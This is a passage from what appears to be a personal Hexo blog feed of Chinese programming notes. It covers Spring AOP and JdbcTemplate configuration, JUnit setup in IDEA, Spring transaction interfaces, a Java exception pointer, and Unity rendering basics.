<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--  扫描包下的注解  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.mengma"</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  启用 AspectJ 的自动代理  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3）创建测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.aspectj.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mengma.dao.CustomerDao;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String xmlPath = <span class="string">"com\\mengma\\aspectj\\xml\\applicationContext.xml"</span>;</span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(xmlPath);</span><br><span class="line">        CustomerDao customerDao = (CustomerDao) applicationContext.getBean(<span class="string">"customerDao"</span>);</span><br><span class="line"></span><br><span class="line">        customerDao.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4）运行测试</p>
<p><img data-src="https://i.loli.net/2021/01/23/lekw2E5Gn3qAfHi.png" alt="image-20210107114214048"></p>
<h1 id="ⅩⅩ、Spring-JDBCTemplate简介"><a href="#ⅩⅩ、Spring-JDBCTemplate简介" class="headerlink" title="ⅩⅩ、Spring JDBCTemplate简介"></a>ⅩⅩ、Spring JDBCTemplate简介</h1><p>Spring 框架针对数据库开发中的应用提供了 JDBCTemplate 类，该类是 Spring 对 JDBC 支持的核心，它提供了所有对数据库操作功能的支持。</p>
<p>Spring 框架提供的JDBC支持主要由四个包组成，分别是 core（核心包）、object（对象包）、dataSource（数据源包）和 support（支持包），org.springframework.jdbc.core.JdbcTemplate 类就包含在核心包中。作为 Spring JDBC 的核心，JdbcTemplate 类中包含了所有数据库操作的基本方法。</p>
<p>JdbcTemplate 类继承自抽象类 JdbcAccessor，同时实现了 JdbcOperations 接口。其直接父类 JdbcAccessor 为子类提供了一些访问数据库时使用的公共属性，具体介绍如下。</p>
<p>1）DataSource</p>
<p>其主要功能是获取数据库连接，具体实现时还可以引入对数据库连接的缓冲池和分布式事务的支持，它可以作为访问数据库资源的标准接口。</p>
<p>2）SQLExceptionTranslator</p>
<p>org.springframework.jdbc.support.SQLExceptionTranslator 接口负责对 SQLException 进行转译工作。通过必要的设置或者获取 SQLExceptionTranslator 中的方法，可以使 JdbcTemplate 在需要处理 SQLException 时，委托 SQLExceptionTranslator 的实现类完成相关的转译工作。</p>
<p>JdbcOperations 接口定义了在 JdbcTemplate 类中可以使用的操作集合，包括添加、修改、查询和删除等操作。</p>
<p>Spring 中 JDBC 的相关信息是在 Spring 配置文件中完成的，其配置模板如下所示：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http:/www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span> </span><br><span class="line">   </span><br><span class="line">    <span class="comment">&lt;!-- 配置数据源 --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.dataSource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--数据库驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span> /&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!--连接数据库的url--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>= <span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost/spring"</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--连接数据库的用户名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--连接数据库的密码--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"root"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置JDBC模板--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"jdbcTemplate"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.core.jdbcTemplate"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--默认必须使用数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置注入类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"xxx"</span> <span class="attr">class</span>=<span class="string">"xxx"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcTemplate"</span> <span class="attr">ref</span>=<span class="string">"jdbcTemplate"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上述代码中，定义了三个 Bean，分别是 dataSource、jdbcTemplate 和需要注入类的 Bean。其中 dataSource 对应的是 DriverManagerDataSource 类，用于对数据源进行配置；jdbcTemplate 对应 JdbcTemplate 类，该类中定义了 JdbcTemplate 的相关配置。</p>
<p>在 dataSource 中，定义了四个连接数据库的属性，如表所示。</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>driverClassName</td>
<td>所使用的驱动名称，对应驱动 JAR 包中的 Driver 类</td>
</tr>
<tr>
<td>url</td>
<td>数据源所在地址</td>
</tr>
<tr>
<td>username</td>
<td>访问数据库的用户名</td>
</tr>
<tr>
<td>password</td>
<td>访问数据库的密码</td>
</tr>
</tbody></table>
<p>表中的属性值需要根据数据库类型或者机器配置的不同进行相应设置。如果数据库类型不同，则需要更改驱动名称。如果数据库不在本地，则需要将 localhost 替换成相应的主机 IP。</p>
<p>在定义 jdbcTemplate 时，需要将 dataSource 注入 jdbcTemplate 中。而在其他的类中要使用 jdbcTemplate，也需要将 jdbcTemplate 注入使用类中（通常注入 dao 类中）。</p>
<p>在 JdbcTemplate 类中，提供了大量的查询和更新数据库的方法，如 query()、update() 等。关于这些方法的具体使用，将在下一节的案例中讲解，此处读者了解即可。</p>
<h1 id="ⅩⅩⅠ、使用-JUnit-单元测试进行代码逻辑性校验"><a href="#ⅩⅩⅠ、使用-JUnit-单元测试进行代码逻辑性校验" class="headerlink" title="ⅩⅩⅠ、使用 JUnit 单元测试进行代码逻辑性校验"></a>ⅩⅩⅠ、使用 JUnit 单元测试进行代码逻辑性校验</h1><p>测试是检查应用程序是否是工作按照要求，并确保在开发者水平，单元测试进入功能性的处理。单元测试是单一实体（类或方法）的测试。 单元测试在每一个软件公司开发高品质的产品给他们的客户是十分必要的。</p>
<p>单元测试可以通过两种方式来完成：</p>
<p><strong>手动测试</strong>：</p>
<ul>
<li>费时和乏味：由于测试案例是由人力的，所以它是非常缓慢而乏味的执行。                     </li>
<li>巨大的人力资源的投入：作为测试用例需要手动执行，所以更多的测试都需要手动测试。                     </li>
<li>较不可靠：手动测试是为测试可能不会被精确地每次执行，因为人为错误导致不可靠。                     </li>
<li>非可编程：无需编程就可以做，获取信息隐藏复杂的测试。</li>
</ul>
<p><strong>自动测试：</strong></p>
<p>以工具支持，并通过使用自动化工具则称为自动化测试执行测试用例。             </p>
<ul>
<li>快速自动化运行测试用例比人力显著更快。                     </li>
<li>人力资源的投入较少：测试用例是通过使用自动化工具，所以较少测试者都需要在自动化测试执行。                     </li>
<li>更可靠：自动化测试在每次运行的时间进行精确的相同操作。                     </li>
<li>可编程：测试人员可以编写复杂的测试，以带出隐藏的信息。</li>
</ul>
<h2 id="1、添加-JUnit-的依赖"><a href="#1、添加-JUnit-的依赖" class="headerlink" title="1、添加 JUnit 的依赖"></a>1、添加 JUnit 的依赖</h2><p>工欲善其事，必先利其器。作用后面再说，先说怎么安装。这里将如何在 IDEA 中添加依赖，如果使用的是 Eclipse，则参见 <a href="https://www.cnblogs.com/happyzm/p/6482886.html" target="_blank" rel="noopener">Eclipse JUnit 依赖的添加</a></p>
<p>我使用的是 IDEA ，IDEA 要使用 JUnit 单元测试功能需要专业版</p>
<p>在设置中的插件模块中将 JUnit 所需插件开启，JUnitGenerator 需要重新下载。</p>
<p><img data-src="https://i.loli.net/2021/01/23/JZ7F89vOmUSfBYa.png" alt="image-20210109151905430"></p>
<p>开启过后无需去官网下载相应的 JAR 包，笔者使用的 IDEA 2020 版本已经自带了 JUnit 4 &amp; 5 版本，但是需要主动的将其添加到项目路径。</p>
<p>随意新建一个类，在其中键入 @Test 注解，在未导入项目路径时，IDEA 自身的错误检查机制会报错，这时只需要借用 IDEA 的错误自动处理机制就可以将依赖添加进项目路径。如图：</p>
<p><img data-src="https://i.loli.net/2021/01/23/b2eA8SnXtdWrjNC.png" alt="image-20210109152552700"></p>
<p>点击添加你需要的版本即可，至此项目依赖添加完毕。</p>
<p>然后指定一个目录为 test 目录，新建或者选取已存在的目录将其属性更改为测试源 根（如果不是中文的话，反正绿色的）</p>
<p><img data-src="https://i.loli.net/2021/01/23/FR51T8IjQuA4shw.png" alt="image-20210109153141444"></p>
<h2 id="2、什么是-JUnit-以及它的作用"><a href="#2、什么是-JUnit-以及它的作用" class="headerlink" title="2、什么是 JUnit 以及它的作用"></a>2、什么是 JUnit 以及它的作用</h2><p>JUnit是一个Java编程语言编写的单元测试框架。 重要的是在测试驱动开发中，并且是一个家族的统称为xUnit单元测试框架中的一个。</p>
<p>JUnit促进“先测试再编码”，它强调建立测试数据的一段代码可以被测试，先测试再编码实现的想法。这种做法就像是“试了一下，码了一点，测试了一下，代码一点点……”这增加了程序员的工作效率和程序代码的稳定性，减少程序员的压力和花在调试的时间。</p>
<h3 id="2-1、JUnit-作用"><a href="#2-1、JUnit-作用" class="headerlink" title="2.1、JUnit 作用"></a>2.1、JUnit 作用</h3><ol>
<li>可以书写一系列的测试方法，对项目所有的接口或者方法进行单元测试。</li>
<li>启动后，自动化测试，并判断执行结果, 不需要人为的干预。</li>
<li>只需要查看最后结果，就知道整个项目的方法接口是否通畅。</li>
<li>每个单元测试用例相对独立，由Junit 启动，自动调用。不需要添加额外的调用语句。</li>
<li>添加，删除，屏蔽测试方法，不影响其他的测试方法。 开源框架都对JUnit 有相应的支持。</li>
</ol>
<h2 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h2><p>1、创建测试用数据接口 JUnitDao</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JUnit单元测试反射等JDK8新特性.JUnit.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">JUnitDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b )</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b )</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、创建实现类 JUnitDaoImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JUnit单元测试反射等JDK8新特性.JUnit.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>(<span class="string">"junitDao"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JUnitDaoImpl</span> <span class="keyword">implements</span> <span class="title">JUnitDao</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、在实现类界面单击右键</p>
<p><img data-src="https://i.loli.net/2021/01/23/5mDvZzYyPwtGOq8.png" alt="image-20210109154709154"></p>
<p><img data-src="https://i.loli.net/2021/01/23/SdpxTiW1u5F2IcZ.png" alt="image-20210109154725113"></p>
<p><img data-src="https://i.loli.net/2021/01/23/RIALdiZhYnN5m9V.png" alt="image-20210109154738317"></p>
<p>按步骤进入如上界面，选中想要测试的方法，之所以选择这个而不是让插件直接生成全部的原因是在实际开发中一个类中方法可能并不需要每一个都进行测试。生成之后如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JUnit单元测试反射等JDK8新特性.JUnit.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.AfterEach;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.BeforeEach;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JUnitDaoImplTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@BeforeEach</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterEach</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">tearDown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、在相应的测试方法中添加方法体进行测试，其中的注解（JUnit 4）如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Junit常用注解(Junit4.xxxx版本)</span><br><span class="line">    * <span class="meta">@Before</span>：用来修饰方法，该方法会在每一个测试方法执行之前执行一次。</span><br><span class="line">    * <span class="meta">@After</span>：用来修饰方法，该方法会在每一个测试方法执行之后执行一次。</span><br><span class="line">    * <span class="meta">@BeforeClass</span>：用来静态修饰方法，该方法会在所有测试方法之前执行一次。</span><br><span class="line">    * <span class="meta">@AfterClass</span>：用来静态修饰方法，该方法会在所有测试方法之后执行一次。</span><br><span class="line"></span><br><span class="line">Junit常用注解(Junit5.xxxx版本)</span><br><span class="line">     * <span class="meta">@BeforeEach</span>：用来修饰方法，该方法会在每一个测试方法执行之前执行一次。</span><br><span class="line">     * <span class="meta">@AfterEach</span>：用来修饰方法，该方法会在每一个测试方法执行之后执行一次。</span><br><span class="line">     * <span class="meta">@BeforeAll</span>：用来静态修饰方法，该方法会在所有测试方法之前执行一次。</span><br><span class="line">     * <span class="meta">@AfterAll</span>：用来静态修饰方法，该方法会在所有测试方法之后执行一次。</span><br></pre></td></tr></table></figure>

<p><em>PS：貌似 AspectJ 不能拦截到在 JUnit 中调用的类的方法，未做检验</em></p>
<h1 id="ⅩⅩⅡ、Spring事务管理接口：PlatformTransactionManager、TransactionDefinition和TransactionStatus"><a href="#ⅩⅩⅡ、Spring事务管理接口：PlatformTransactionManager、TransactionDefinition和TransactionStatus" class="headerlink" title="ⅩⅩⅡ、Spring事务管理接口：PlatformTransactionManager、TransactionDefinition和TransactionStatus"></a>ⅩⅩⅡ、Spring事务管理接口：PlatformTransactionManager、TransactionDefinition和TransactionStatus</h1><p><a href="http://c.biancheng.net/spring/" target="_blank" rel="noopener">Spring</a> 的事务管理是基于 AOP 实现的，而 AOP 是以方法为单位的。Spring 的事务属性分别为传播行为、隔离级别、只读和超时属性，这些属性提供了事务应用的方法和描述策略。</p>
<p>在 <a href="http://c.biancheng.net/java/" target="_blank" rel="noopener">Java</a> EE 开发经常采用的分层模式中，Spring 的事务处理位于业务逻辑层，它提供了针对事务的解决方案。</p>
<p>在 Spring 解压包的 libs 目录中，包含一个名称为 spring-tx-3.2.13.RELEASE.jar 的文件，该文件是 Spring 提供的用于事务管理的 JAR 包，其中包括事务管理的三个核心接口：PlatformTransactionManager、TransactionDefinition 和 TransactionStatus。</p>
<p>将该 JAR 包的后缀名 jar 改成 zip 的形式后，解压压缩包，进入解压文件夹中的 \org\springframework\transaction 目录后，该目录中的文件如图所示。</p>
<p><img data-src="https://i.loli.net/2021/01/23/ZiNE96A4IznM2jX.png" alt="事务管理核心接口"></p>
<p>在图中，方框所标注的三个文件就是本节将要讲解的核心接口。这三个核心接口的作用及其提供的方法如下。</p>
<h4 id="1-PlatformTransactionManager"><a href="#1-PlatformTransactionManager" class="headerlink" title="1. PlatformTransactionManager"></a>1. PlatformTransactionManager</h4><p>PlatformTransactionManager 接口是 Spring 提供的平台事务管理器，用于管理事务。该接口中提供了三个事务操作方法，具体如下。</p>
<ul>
<li>TransactionStatus getTransaction（TransactionDefinition definition）：用于获取事务状态信息。</li>
<li>void commit（TransactionStatus status）：用于提交事务。</li>
<li>void rollback（TransactionStatus status）：用于回滚事务。</li>
</ul>
<p>在项目中，Spring 将 xml 中配置的事务详细信息封装到对象 TransactionDefinition 中，然后通过事务管理器的 getTransaction() 方法获得事务的状态（TransactionStatus），并对事务进行下一步的操作。</p>
<h4 id="2-TransactionDefinition"><a href="#2-TransactionDefinition" class="headerlink" title="2. TransactionDefinition"></a>2. TransactionDefinition</h4><p>TransactionDefinition 接口是事务定义（描述）的对象，它提供了事务相关信息获取的方法，其中包括五个操作，具体如下。</p>
<ul>
<li>String getName()：获取事务对象名称。</li>
<li>int getIsolationLevel()：获取事务的隔离级别。</li>
<li>int getPropagationBehavior()：获取事务的传播行为。</li>
<li>int getTimeout()：获取事务的超时时间。</li>
<li>boolean isReadOnly()：获取事务是否只读。</li>
</ul>
<p>在上述五个方法的描述中，事务的传播行为是指在同一个方法中，不同操作前后所使用的事务。传播行为的种类如表 1 所示。</p>
<table>
<thead>
<tr>
<th>属性名称</th>
<th>值</th>
<th>描 述</th>
</tr>
</thead>
<tbody><tr>
<td>PROPAGATION_REQUIRED</td>
<td>required</td>
<td>支持当前事务。如果 A 方法已经在事务中，则 B 事务将直接使用。否则将创建新事务</td>
</tr>
<tr>
<td>PROPAGATION_SUPPORTS</td>
<td>supports</td>
<td>支持当前事务。如果 A 方法已经在事务中，则 B 事务将直接使用。否则将以非事务状态执行</td>
</tr>
<tr>
<td>PROPAGATION_MANDATORY</td>
<td>mandatory</td>
<td>支持当前事务。如果 A 方法没有事务，则抛出异常</td>
</tr>
<tr>
<td>PROPAGATION_REQUIRES_NEW</td>
<td>requires_new</td>
<td>将创建新的事务，如果 A 方法已经在事务中，则将 A 事务挂起</td>
</tr>
<tr>
<td>PROPAGATION_NOT_SUPPORTED</td>
<td>not_supported</td>
<td>不支持当前事务，总是以非事务状态执行。如果 A 方法已经在事务中，则将其挂起</td>
</tr>
<tr>
<td>PROPAGATION_NEVER</td>
<td>never</td>
<td>不支持当前事务，如果 A 方法在事务中，则抛出异常</td>
</tr>
<tr>
<td>PROPAGATION.NESTED</td>
<td>nested</td>
<td>嵌套事务，底层将使用 Savepoint 形成嵌套事务</td>
</tr>
</tbody></table>
<p>在事务管理过程中，传播行为可以控制是否需要创建事务以及如何创建事务。</p>
<p>通常情况下，数据的查询不会改变原数据，所以不需要进行事务管理，而对于数据的增加、修改和删除等操作，必须进行事务管理。如果没有指定事务的传播行为，则 Spring3 默认的传播行为是 required。</p>
<h4 id="3-TransactionStatus"><a href="#3-TransactionStatus" class="headerlink" title="3. TransactionStatus"></a>3. TransactionStatus</h4><p>TransactionStatus 接口是事务的状态，它描述了某一时间点上事务的状态信息。其中包含六个操作，具体如表 2 所示。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>void flush()</td>
<td>刷新事务</td>
</tr>
<tr>
<td>boolean hasSavepoint()</td>
<td>获取是否存在保存点</td>
</tr>
<tr>
<td>boolean isCompleted()</td>
<td>获取事务是否完成</td>
</tr>
<tr>
<td>boolean isNewTransaction()</td>
<td>获取是否是新事务</td>
</tr>
<tr>
<td>boolean isRollbackOnly()</td>
<td>获取是否回滚</td>
</tr>
<tr>
<td>void setRollbackOnly()</td>
<td>设置事务回滚</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JavaSpring</tag>
      </tags>
  </entry>
  <entry>
    <title>java.util.ConcurrentModificationException</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/java-util-ConcurrentModificationException/</url>
    <content><![CDATA[<p>在使用迭代器进行数组的遍历时遇到报错：java.util.ConcurrentModificationException</p>
<p>原因：<a href="https://www.jianshu.com/p/c5b52927a61a" target="_blank" rel="noopener">https://www.jianshu.com/p/c5b52927a61a</a></p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Exceptions</tag>
      </tags>
  </entry>
  <entry>
    <title>Unity</title>
    <url>/hexo-test/uncategorized/Unity/</url>
    <content><![CDATA[<p>unity是创建游戏和三维互动内容开发工具<br>2D游戏：锁定视角，二维坐标<br>3D游戏：无锁定视角，三维坐标（x,y,z）<br>游戏引擎：游戏的核心代码，提供各种功能<br>使用：<br>鼠标滚轮：放大缩小<br>Q或鼠标滚轮（按下）：拖动场景<br>鼠标右键：基于目前视角旋转<br>鼠标左键：选中<br>W：切换到物体移动<br>R：切换到物体缩放<br>E：旋转物体<br>CTRL（按住）：基于坐标轴平移<br>Ｆ键或层级面板中双击对象：将选中对象在sence面板置中<br>alt+鼠标左键：围绕对象旋转<br>alt+鼠标右键：缩放场景<br>右键+WSDAQE可实现场景漫游<br>V键+鼠标左键选中顶点：顶点吸附（与其他对象以顶点为目标进行贴附）<br>CTRL + D：复制<br>CTRL + SHIFT + F : 把选中物体移动到视角点</p>
<a id="more"></a>

<p>物体是一个容器，mesh 决定物体的颜色和外观（mesh filter &amp; mesh renderer（负责渲染））<br>创建物体默认在屏幕中间<br>子对象的偏移（指各种偏移）是相对于其父对象的偏移<br>子物体将继承父物体的更改，但是子物体不影响父物体</p>
<pre><code>* 一般将公用组件放在父物体上，防止更改模型</code></pre><p>材质：指包含颜色、纹理（附加到物体表面的贴图）、光滑度等的Shader的实例<br>    * Shader：专门用来渲染图形的技术，可以使纹理以某种形式展示。实际上就是一段嵌入到渲染管线中的程序，可以控制GPU运算图像效果的算法。不同的Shader可设定的属性值一般不同。<br>    * 材质属性存在于mesh renderer的Materials里面<br>    * <strong>导入Shader：需要通过材质来导入</strong></p>
<p>天空盒（是一个独立的组件）：围绕整个场景的包装器，用于模拟天空的<strong>材质</strong><br>使用：<br>    * 设置摄像机 Clear Flags 属性为 Skybox<br>    * 方式一：摄像机添加组件 Skybox<br>    * 方式二：光照窗口 Window - Lighting - Environment Lighting - Skybox<br>        此方法可以作为反射源将天空色彩反射到场景中物体（常用，真实性up）<br>    * 6 Sided：六张图片联合渲染成整个场景<br>    * Procedural：默认天空盒</p>
<p>渲染管线：<br>    图形数据在GPU上经过运算处理，最后输出到屏幕的过程<br>    CPU || 游戏 -&gt; 图形API -&gt; GPU || 顶点处理 -&gt; 图元装配 -&gt; 光栈化 -&gt; 像素处理 -&gt; 缓存<br>    * draw call ：每帧调用显卡渲染物体的次数<br>    * 顶点处理 ：接受模型顶点数据；坐标系转换（游戏坐标 -&gt; 屏幕2D坐标）；<br>    * 图元装配 ：组装面：连接相邻的顶点，绘制成三角面<br>    * 光栅化 ：计算三角面上的像素，为后面的着色阶段提供合理的插值参数<br>    * 像素处理 ：对每个像素区域进行着色；写入到缓存当中<br>    * 缓存 （起缓冲作用）：一个存储箱数数据的内存块，最重要的是帧缓存和深度缓存；<br>    * * 帧缓存：存储每个像素的色彩，即渲染后的图像。帧缓存常常在显存中，显卡不断地读取并输出到屏幕中。<br>    * * 深度缓存 z-buffer ：存储像素的深度信息，即物体到摄像机的距离。光栅化时便计算各像素的深度值，如果新的深度值比现有的近，则像素颜色被写到帧缓存，并替换深度缓存（即重叠时显示更近的或者上层的物体面）。<br><strong>Occlusion Culling （及时遮挡剔除）：当物体被松紧渲染流水线之前，将摄像机视角内看不到的物体进行剔除，从而减少了每帧渲染数据量，提高渲染性能。</strong><br>    * 原理 ：由摄像机发射出射线，当射线与物体发生碰撞时（<strong>需要添加碰撞器Collider组件</strong>），渲染该层，反之则剔除。<br>    * 优点 ：优化性能，减少GPU占用<br>    * 缺点 ：判断是否被遮挡需要CPU额外的开销，当场景中存在大量的分布密集的物体时使用。</p>
<p>LOD（Levels of Detail多细节层次） ：<br>    LOD技术指根据物体模型节点（顶点）在显示环境中所处的位置和重要度，决定物体渲染的资源分配，降低非重要物体的面数和细节度，从而获得高效率的渲染运算。</p>
<p>GI（Global Illumination,全局光照）：<br>    能够计算直接光，间接光、环境光以及反射光的光照系统。通过GI算法可以使得渲染出来的光照效果更加的真实丰富。<br>    * 直接光 ：从物体直接散发出的光照<br>    * 间接光 ：光照打到物体上被反射的光（Lightmap static）<br>    * 烘焙 ：当场景包含大量物体时，实时光照和阴影对游戏性能有很大的影响。使用烘焙技术可以将光线效果预渲染成贴图再作用到物体上模拟光影，从而提高性能。适用于在性能较低的设备上运行的程序。</p>
]]></content>
  </entry>
  <entry>
    <title>Java随笔1</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Notes/note1/</url>
